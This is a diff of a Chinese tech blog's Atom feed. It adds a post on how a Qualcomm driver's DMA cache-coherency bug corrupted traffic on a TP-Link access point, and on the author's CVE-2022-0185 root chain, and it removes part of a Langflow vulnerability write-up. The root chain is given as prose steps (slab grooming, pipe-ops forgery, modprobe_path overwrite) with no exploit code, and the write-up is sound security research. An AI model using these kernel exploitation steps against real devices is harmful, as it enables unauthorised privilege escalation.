@@ -1,5 +1,101 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Kane's Blog - Kane</title><link href="/" rel="alternate"/><link href="feeds/kane.atom.xml" rel="self"/><id>/</id><updated>2026-10-14T00:00:00+08:00</updated><entry><title>拆开你的硬件钱包：一块 eSIM 植入板如何从授权经销商流进全球供应链</title><link href="posts/2026-10-14-ledger-hardware-implant-esim-supply-chain.html" rel="alternate"/><published>2026-10-14T00:00:00+08:00</published><updated>2026-10-14T00:00:00+08:00</updated><author><name>Kane</name></author><id>tag:None,2026-10-14:posts/2026-10-14-ledger-hardware-implant-esim-supply-chain.html</id><summary type="html">&lt;ul&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Kane's Blog - Kane</title><link href="/" rel="alternate"/><link href="feeds/kane.atom.xml" rel="self"/><id>/</id><updated>2026-10-15T00:00:00+08:00</updated><entry><title>为了一个下载抖动，他挖出高通驱动的 DMA 缓存不一致漏洞，顺手写了条 root 提权链</title><link href="posts/2026-10-15-tp-link-eap770-dma-cache-coherency-kernel-exploit.html" rel="alternate"/><published>2026-10-15T00:00:00+08:00</published><updated>2026-10-15T00:00:00+08:00</updated><author><name>Kane</name></author><id>tag:None,2026-10-15:posts/2026-10-15-tp-link-eap770-dma-cache-coherency-kernel-exploit.html</id><summary type="html">&lt;ul&gt;
+&lt;li&gt;内核安全&lt;/li&gt;
+&lt;li&gt;DMA&lt;/li&gt;
+&lt;li&gt;逆向工程&lt;/li&gt;
+&lt;li&gt;漏洞利用&lt;/li&gt;
+&lt;li&gt;网络驱动&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;p&gt;一个 TP-Link EAP770 无线 AP，从买回来那天起就在悄悄损坏数据：大文件下载会失败，SSH 报 MAC …&lt;/p&gt;</summary><content type="html">&lt;ul&gt;
+&lt;li&gt;内核安全&lt;/li&gt;
+&lt;li&gt;DMA&lt;/li&gt;
+&lt;li&gt;逆向工程&lt;/li&gt;
+&lt;li&gt;漏洞利用&lt;/li&gt;
+&lt;li&gt;网络驱动&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;p&gt;一个 TP-Link EAP770 无线 AP，从买回来那天起就在悄悄损坏数据：大文件下载会失败，SSH 报 MAC 错误，TLS 报 &lt;code&gt;bad record mac&lt;/code&gt;。两年多以后，一位工程师顺着这条线索挖到了高通 &lt;code&gt;qca-nss-dp&lt;/code&gt; 驱动里一个 DMA 缓存一致性问题，最后为了改两个只读的 sysfs 开关，写了一条完整的 Linux 内核提权链。&lt;/p&gt;
+&lt;p&gt;这篇文章把这条链路拆开：从"数据被谁改了"的排障，到硬件级的根因，再到拿 root 的过程。它值得看的地方在于：&lt;strong&gt;一个真实世界的缓存一致性 bug 是怎么伪装成网络故障的&lt;/strong&gt;，以及当厂商不给你修的时候，一个开发者能走多远。&lt;/p&gt;
+&lt;h2&gt;症状：损坏是"有效"的&lt;/h2&gt;
+&lt;p&gt;设备是 EAP770(EU) v1.0，高通 IPQ9574 平台，Linux 5.4.164，固件停留在出厂版本 1.0.0 Build 20230605。作者 2023 年 8 月买的，那时候 Wi-Fi 7 标准都还没定稿。&lt;/p&gt;
+&lt;p&gt;最早的表现很分散：rsync 同步大于几 GiB 的文件会失败，SSH 报 MAC 错误。看起来像 rsync 或 SSH 的问题，毕竟 Wireshark 抓包里零坏校验和、零重传，单个 UDP 随机字节流也干干净净。作者一度以为是 TCP 该干的活没干好。&lt;/p&gt;
+&lt;p&gt;关键转折出现在 tcpdump 抓一次失败的 HTTPS 下载：&lt;strong&gt;一个 1440 字节的 TCP 段，中间连续 64 个字节是错的，但 TCP 校验和有效&lt;/strong&gt;。而 &lt;code&gt;TcpInCsumErrors&lt;/code&gt; 始终是 0。&lt;/p&gt;
+&lt;p&gt;这句话是整个事件的题眼：校验和对一段已经损坏的数据是成立的。也就是说，&lt;strong&gt;有人在校验和算完之后改动了载荷&lt;/strong&gt;。TCP 把段交给 TLS，TLS 用端到端的 MAC 才发现问题，于是报 &lt;code&gt;bad record mac&lt;/code&gt;。TLS 和 SSH 的完整性校验，是唯一在"TCP 层已经接受"之后还能拦住这类损坏的防线。&lt;/p&gt;
+&lt;p&gt;进一步的定位很讲究方法论。作者放弃加密流量，改成有线机到 Wi-Fi 机之间跑原始 TCP，收发自己构造的已知数据，逐字节比对：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;损坏&lt;strong&gt;只在多个 TCP 流并发时出现&lt;/strong&gt;，方向固定为 LAN → Wi-Fi；&lt;/li&gt;
+&lt;li&gt;测试里 8192 MiB 数据出现 3 个坏块，&lt;strong&gt;每块正好 64 字节，且都以零开头&lt;/strong&gt;；&lt;/li&gt;
+&lt;li&gt;换掉笔记本网卡（MediaTek 换高通）后损坏依旧，排除了客户端；&lt;/li&gt;
+&lt;li&gt;有线客户端干净、坏帧的 CCMP MIC 完整，排除了网线和空口。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;64 字节正好是 IPQ9574 核心的一条 cache line，这个数字直接把怀疑指向&lt;strong&gt;缓存或 DMA，而不是翻转的比特&lt;/strong&gt;。这条路径上同时"加速桥接流量"又"重算校验和"的，只有高通的 SFE/PPE offload。&lt;/p&gt;
+&lt;h2&gt;根因：一次写回，覆盖了已经收到的包&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;qca-nss-dp&lt;/code&gt; 驱动在把包缓冲还给网卡时，没有同步整块接收缓冲的 CPU 缓存。在这块硬件上，DMA 直接写 DRAM，不跟 CPU 缓存保持一致。于是&lt;strong&gt;上一次使用留下的脏 cache line，会在网卡收到新包之后被写回内存，把新包的一部分覆盖掉&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;代码层面看得很清楚。发送快速路径只清理当前 &lt;code&gt;skb-&amp;gt;data&lt;/code&gt; 开始的线性部分：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;buff_addr&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dma_addr_t&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;virt_to_phys&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;skb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="n"&gt;EDMA_TXDESC_BUFFER_ADDR_SET&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;buff_addr&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="n"&gt;dmac_clean_range_no_dsb&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;skb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;skb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;buf_len&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;然后设置 &lt;code&gt;skb-&amp;gt;fast_recycled = 1&lt;/code&gt; 把缓冲放回 per-CPU 回收链表，&lt;strong&gt;不清内容&lt;/strong&gt;。等这个缓冲被接收路径复用时，refill 代码看到这个标志就跳过了 invalidate：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;unlikely&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;skb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;fast_recycled&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;dmac_inv_range_no_dsb&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;skb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;span class="w"&gt;                          &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;skb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;rx_alloc_size&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;
+&lt;span class="w"&gt;                          &lt;/span&gt;&lt;span class="n"&gt;EDMA_RX_SKB_HEADROOM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;NET_IP_ALIGN&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="n"&gt;skb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;fast_recycled&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;问题就出在范围对不上：&lt;strong&gt;接收区域是 1856 字节（29 条 cache line），从 head + 192 开始；而之前发送只从另一个偏移清理了两三条 line&lt;/strong&gt;。这个被漏掉的区间里如果留着脏数据，就会在网卡 DMA 之后被写回，一次替换 64 字节。&lt;/p&gt;
+&lt;p&gt;正常缓存淘汰会触发这种写回；在 arm64 上，对非对齐区间做 invalidate 同样会触发，&lt;code&gt;__dma_inv_area&lt;/code&gt; 对边缘 line 用的是 &lt;code&gt;dc civac&lt;/code&gt;（clean and invalidate）。数据一旦被覆盖到 DRAM，再 invalidate CPU 缓存也救不回来。&lt;/p&gt;
+&lt;p&gt;最讽刺的一环在 SFE/PPE：它&lt;strong&gt;在损坏之后重算校验和&lt;/strong&gt;，于是客户端拿到的是一个对垃圾数据成立的全新 TCP 校验和。TCP 照单全收，只有 TLS/SSH 的端到端 MAC 能发现。&lt;/p&gt;
+&lt;p&gt;x86 上不会有这个问题，因为硬件保证 DMA 与 CPU 缓存一致。这也是为什么这种 bug 只在特定 SoC 上露头：&lt;strong&gt;它不是通用内核 bug，是特定平台 + 特定加速路径的组合&lt;/strong&gt;。作者顺带在内核源码里发现了其他几个驱动有类似的 DMA 缓存维护问题，但暂时没法在硬件上验证，也不知道该报给谁。&lt;/p&gt;
+&lt;p&gt;缓冲回收由 &lt;code&gt;CONFIG_SKB_RECYCLER&lt;/code&gt; 控制，是编译期选项，没有运行时开关。&lt;/p&gt;
+&lt;h2&gt;拿 root：关掉 offload 要先提权&lt;/h2&gt;
+&lt;p&gt;修复方式其实就两条命令：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;/sys/sfe/l2_feature
+&lt;span class="nb"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;/sys/sfe/ppe_rfs_feature
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;但这两个文件只有 root 能写，而 TP-Link 的 SSH shell 以 uid 1 运行、没有任何 capability，Web 界面也没有对应开关。更绝的是：设备已 End-of-Life，没有 v1 固件可打补丁；v2 固件是别的硬件，设备直接拒收；新版固件还加密了。直接刷 flash 需要编程夹，作者不想为了一台已经很烦的 AP 去折腾。&lt;/p&gt;
+&lt;p&gt;设备本身加固得还不错：作者在 TP-Link 自己的二进制里没找到任何可利用点，白名单到处都在，只加载需要的模块。所以入口只能是内核。&lt;/p&gt;
+&lt;p&gt;于是有了这条链，底子是 &lt;strong&gt;CVE-2022-0185&lt;/strong&gt;：&lt;code&gt;legacy_parse_param()&lt;/code&gt; 里的整数下溢，可从非特权 user namespace 触发，能让一次写越过 4 KiB slab 对象的边界。NVD 给它的评分是 &lt;strong&gt;CVSS 3.1 = 8.4 HIGH&lt;/strong&gt;，攻击向量 &lt;code&gt;AV:L/AC:L/PR:N/UI:N&lt;/code&gt;，本地、无需权限、无需交互。&lt;/p&gt;
+&lt;p&gt;利用的关键步骤：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;unshare 进 user namespace&lt;/strong&gt;，让 &lt;code&gt;fsopen&lt;/code&gt; 可达，从而能触发下溢；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;整理 4 KiB slab&lt;/strong&gt;：先做几百次同尺寸分配做碎片整理，再把溢出源、受害者 key、SysV message、pipe ring 摆到相邻位置；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;溢出进受害者 key 的元数据&lt;/strong&gt;，放大它的长度字段；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;读回 key 造成信息泄露&lt;/strong&gt;，拿到相邻对象，包括某个 pipe 的 &lt;code&gt;buf[0].ops&lt;/code&gt;，里面有 &lt;code&gt;anon_pipe_buf_ops&lt;/code&gt; 的地址；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;把一条 pipe 的 buffer 指向另一条 pipe 的 ring page&lt;/strong&gt;，再用泄露的 ops 指针在第二个 ring 里伪造一个表项；&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;pipe_buf_can_merge()&lt;/code&gt; 会检查 ops 指针是否匹配，所以一个伪造表项上的 merge 写就能&lt;strong&gt;触达任意物理页&lt;/strong&gt;，包括内核镜像的页；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;扫 .data 找到 &lt;code&gt;modprobe_path&lt;/code&gt;&lt;/strong&gt;；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;覆写 &lt;code&gt;modprobe_path&lt;/code&gt;&lt;/strong&gt;，然后 execve 一个魔数不匹配任何二进制格式的文件，内核调用 &lt;code&gt;request_module()&lt;/code&gt;，把这个替换路径以全局 uid 0 执行。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;这里有个特别优雅的细节：通过 pipe 读内核镜像页，正常会在缓冲消费时对保留页调 &lt;code&gt;put_page()&lt;/code&gt;，触发 &lt;code&gt;Bad page map&lt;/code&gt; 然后 panic。但 &lt;code&gt;pipe_read&lt;/code&gt; 只调 &lt;code&gt;-&amp;gt;confirm&lt;/code&gt; 和 &lt;code&gt;-&amp;gt;release&lt;/code&gt;，&lt;strong&gt;不检查 ops 表是否是真的&lt;/strong&gt;。作者伪造一个 &lt;code&gt;pipe_buf_operations&lt;/code&gt;，两个入口都指向 &lt;code&gt;generic_pipe_buf_confirm&lt;/code&gt;（返回 0、什么也不做），就能在扫描时只读不释放，一路走 .data 找字符串。&lt;/p&gt;
+&lt;p&gt;因为损坏的 offload 重启后会回来，exploit &lt;strong&gt;必须让 AP 保持运行&lt;/strong&gt;，不能靠崩溃重启。而溢出会把 4 KiB slab 留在一个状态，第二次尝试就 panic，所以&lt;strong&gt;每次启动只有一次机会&lt;/strong&gt;。&lt;/p&gt;
+&lt;h2&gt;工程量：两个不明显的坑&lt;/h2&gt;
+&lt;p&gt;作者没有 v1 的 GPL 源码（TP-Link 没放），只能拿最接近的 EAP783 源码凑，其内核配置跟设备 &lt;code&gt;/proc/config.gz&lt;/code&gt; 差三行装饰性内容。他在 QEMU 里用这份配置把链跑通，再上真机，中间踩了两个坑：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;加载基址不同&lt;/strong&gt;：QEMU 把内核装在物理 &lt;code&gt;0x40080000&lt;/code&gt;，设备是 &lt;code&gt;0x42080000&lt;/code&gt;，差 &lt;code&gt;0x2000000&lt;/code&gt;，所有地址计算全偏。正确基址藏在 EAP783 源码的一个构建配置变量里。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;段偏移各自不同&lt;/strong&gt;：即使修好基址，设备的 &lt;code&gt;.text&lt;/code&gt;、&lt;code&gt;.rodata&lt;/code&gt;、&lt;code&gt;.data&lt;/code&gt; 相对 QEMU 构建&lt;strong&gt;移动的量还不一样&lt;/strong&gt;，所以"给所有地址加同一个偏移"是行不通的。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;内核没有 KASLR，地址在重启之间不变，但 kallsyms 被清零了，地址仍然得运行时找。&lt;/p&gt;
+&lt;p&gt;整个过程花了大约 &lt;strong&gt;17 小时的"token 赌博"&lt;/strong&gt;，包括用 radare2 读设备二进制、核对启用的保护、反复处理崩溃。&lt;/p&gt;
+&lt;p&gt;效果是可量的：关掉 offload 在这个测试里&lt;strong&gt;损失约 8% 的下载速度&lt;/strong&gt;。但换来的是数据正确：开着 offload 时，他一次都没法单流下载大文件，只有分块下载能过；关掉之后跑一整夜零坏块，之后大文件下载一直正常。上传方向本来就是干净的。&lt;/p&gt;
+&lt;p&gt;作者在 NAS 上放了个 watcher 轮询 AP，offload 一回来就重跑 exploit；失败就通过 TP-Link 的管理 API 重启 AP 再试，带重启次数上限。&lt;/p&gt;
+&lt;h2&gt;一个开发者的视角&lt;/h2&gt;
+&lt;p&gt;这件事有三层值得记下来的东西。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;第一，缓存一致性 bug 会伪装成上层故障。&lt;/strong&gt; 它表现为 rsync 失败、SSH MAC 错误、TLS &lt;code&gt;bad record mac&lt;/code&gt;，全都在错误的地方。诊断的突破口是"校验和有效的损坏数据"这个矛盾：一旦你意识到校验和对垃圾成立，就说明损坏发生在校验和计算之后，嫌疑范围立刻从"传输层"缩到"改包的那一层"。这套推理在排查任何"数据下游对不上上游"的问题时都适用。顺带一个直接的防御启示：&lt;strong&gt;端到端完整性校验（TLS/SSH MAC）是最后一层能拦住这类链路层损坏的防线&lt;/strong&gt;，别为了性能把它省掉。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;第二，offload 换性能是有代价的。&lt;/strong&gt; SFE/PPE 这类硬件加速让包绕过正常协议栈，8% 的速度换来的是"驱动一有小 bug，正确性就没了"。在关键链路上，遇到数据完整性问题时，先把 offload 关掉做对照实验，是很值得放进口袋的第一步。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;第三，当厂商不给你修的时候。&lt;/strong&gt; 这台 AP 固件停在 2023 年，官方回复是 End-of-Life 不再更新。作者的选择是：设备在我家里、我知道该改哪个开关、而你的软件不让我改，那就自己想办法。这种"自己的硬件凭什么不让修"的态度，是这整篇文章的动机。顺带说一句：&lt;strong&gt;买未定稿标准的设备要谨慎&lt;/strong&gt;，这台 AP 买在 Wi-Fi 7 定稿前，没有 Wi-Fi Alliance 认证，代价是两年多的数据损坏。&lt;/p&gt;
+&lt;p&gt;对做固件和驱动的同学，这里还有个直接的提醒：&lt;code&gt;CONFIG_SKB_RECYCLER&lt;/code&gt; 这类"跳过 invalidate"的优化，前提是发/收两侧的清理范围严格对齐。只要有一次清理范围对不上，"脏 line 写回覆盖新收到的包"就会变成一个只在多流并发下才出现的幽灵 bug，而且校验和会被后来重算，让所有基于校验和的排查手段全部失效。&lt;/p&gt;
+&lt;h2&gt;⚠️ 网络安全免责声明&lt;/h2&gt;
+&lt;p&gt;本文内容仅供技术研究与安全学习之用。文中描述的漏洞分析、攻击链拆解和代码示例均基于公开披露的安全研究，旨在帮助开发者理解攻击原理、提升安全意识和防御能力。&lt;/p&gt;
+&lt;p&gt;请勿将本文所述技术用于任何未经授权的安全测试、渗透攻击或非法用途。任何因滥用本文信息而造成的法律后果，由使用者自行承担，与本文作者无关。&lt;/p&gt;
+&lt;p&gt;如发现系统安全漏洞，请通过合法渠道向相关厂商或平台报告，共同维护网络安全生态。&lt;/p&gt;
+&lt;hr /&gt;
+&lt;p&gt;原文：&lt;a href="https://blog.dfb.sh/blog/eap770-root-for-two-zeros/"&gt;https://blog.dfb.sh/blog/eap770-root-for-two-zeros/&lt;/a&gt;&lt;/p&gt;</content></entry><entry><title>拆开你的硬件钱包：一块 eSIM 植入板如何从授权经销商流进全球供应链</title><link href="posts/2026-10-14-ledger-hardware-implant-esim-supply-chain.html" rel="alternate"/><published>2026-10-14T00:00:00+08:00</published><updated>2026-10-14T00:00:00+08:00</updated><author><name>Kane</name></author><id>tag:None,2026-10-14:posts/2026-10-14-ledger-hardware-implant-esim-supply-chain.html</id><summary type="html">&lt;ul&gt;
 &lt;li&gt;供应链安全&lt;/li&gt;
 &lt;li&gt;硬件安全&lt;/li&gt;
 &lt;li&gt;逆向工程&lt;/li&gt;
@@ -11121,533 +11217,4 @@ slug: 矿卡撬动a100-gpu安全设计系统性缺陷深度分析&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;准确性声明&lt;/strong&gt;：本文基于公开研究资料撰写，作者不对技术细节的绝对准确性作任何担保。NVIDIA 可能已在后续产品或驱动更新中修复相关缺陷，具体技术现状以官方信息为准。&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;研究免责&lt;/strong&gt;：本文提及的 BarraCUDA、Kraken、Leaky DNN、MERCURY 等侧信道研究均为独立学术成果，本文仅作综述引用，不代表这些工具可用于实际攻击部署。&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;责任限制&lt;/strong&gt;：在适用法律允许的最大范围内，本文作者及发布平台不对读者基于本文内容采取的任何行为及其后果承担任何直接或间接责任。&lt;/li&gt;
-&lt;/ol&gt;</content><category term="技术"/></entry><entry><title>一行未授权请求干穿 CVSS 10 的 Langflow（CVE-2026-10561）</title><link href="posts/2026-08-05-langflow-cve-2026-10561wei-shou-quan-qing-qiu-gan-chuan-cvss10.html" rel="alternate"/><published>2026-08-05T00:00:00+08:00</published><updated>2026-08-05T00:00:00+08:00</updated><author><name>Kane</name></author><id>tag:None,2026-08-05:posts/2026-08-05-langflow-cve-2026-10561wei-shou-quan-qing-qiu-gan-chuan-cvss10.html</id><summary type="html">&lt;ul&gt;
-&lt;li&gt;技术
-slug: langflow-cve-2026-10561未授权请求干穿cvss10&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr /&gt;
-&lt;h2&gt;一、背景：当"在画布上写 Python"成为产品的核心卖点&lt;/h2&gt;
-&lt;p&gt;Langflow 是一款开源的可视化 AI 流程编排工具，用 Python 编写，后被 IBM 收编纳 …&lt;/p&gt;</summary><content type="html">&lt;ul&gt;
-&lt;li&gt;技术
-slug: langflow-cve-2026-10561未授权请求干穿cvss10&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr /&gt;
-&lt;h2&gt;一、背景：当"在画布上写 Python"成为产品的核心卖点&lt;/h2&gt;
-&lt;p&gt;Langflow 是一款开源的可视化 AI 流程编排工具，用 Python 编写，后被 IBM 收编纳入其 AI 产品线。它的核心设计哲学可以用一句话概括：&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;"让用户在画布上写 Python，宿主机真的执行。"&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;这句话听起来理所当然，但它的潜台词非常危险——任何一个能触达"Python 执行节点"的请求，本质上都握有宿主机上 Python 解释器的完整能力。Langflow 把这种能力当作"功能"来售卖，而不是当作"攻击面"来防御。&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;项目信息&lt;/th&gt;
-&lt;th&gt;内容&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;受影响版本&lt;/td&gt;
-&lt;td&gt;1.0.0 - 1.9.3&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;修复版本&lt;/td&gt;
-&lt;td&gt;1.9.4&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;漏洞组件&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;PythonREPLComponent&lt;/code&gt;（UI 上显示为 "Python Interpreter"）&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;CVSS 3.1 评分&lt;/td&gt;
-&lt;td&gt;&lt;strong&gt;10.0&lt;/strong&gt;（AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H）&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;修复方式&lt;/td&gt;
-&lt;td&gt;升级到 1.9.4，&lt;strong&gt;无 Workarounds&lt;/strong&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;CVE-2026-10561 之所以能拿到 CVSS 满分 10.0，不是因为它有多"复杂"，而是因为它精准地踩中了两个独立的、各自看似"不算致命"的缺陷，而这两个缺陷叠加在一起，构成了从"互联网上的任意匿名用户"到"宿主机任意代码执行"的完整闭环。&lt;/p&gt;
-&lt;hr /&gt;
-&lt;h2&gt;二、漏洞组件：PythonREPLComponent&lt;/h2&gt;
-&lt;p&gt;Langflow 的画布上有一个组件叫做 &lt;code&gt;PythonREPLComponent&lt;/code&gt;，在 UI 中显示为 "Python Interpreter"。它的职责很直接：接收用户提交的一段 Python 代码，然后在服务端用 &lt;code&gt;exec()&lt;/code&gt; 执行它。&lt;/p&gt;
-&lt;p&gt;为了"看起来安全"，这个组件实现了基于白名单的 &lt;code&gt;global_imports&lt;/code&gt; 机制，试图把用户代码可访问的模块限制在一个小范围内（默认仅 &lt;code&gt;["math"]&lt;/code&gt;）。设计者的推理是：白名单只放 math → 没有 os/subprocess/socket → 因此"安全"。但这个推理链条的第一步就是错的。&lt;/p&gt;
-&lt;hr /&gt;
-&lt;h2&gt;三、根因机制：CPython &lt;code&gt;exec()&lt;/code&gt; 的 builtins 自动注入&lt;/h2&gt;
-&lt;p&gt;这是整个漏洞最精妙、也最容易被忽视的部分。IBM 安全公告对此给出了精确描述。&lt;/p&gt;
-&lt;h3&gt;3.1 漏洞代码概念模型&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# 漏洞代码概念模型&lt;/span&gt;
-&lt;span class="k"&gt;def&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;get_globals&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="n"&gt;globals_&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;
-    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;module_name&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;global_imports&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  &lt;span class="c1"&gt;# default: [&amp;quot;math&amp;quot;]&lt;/span&gt;
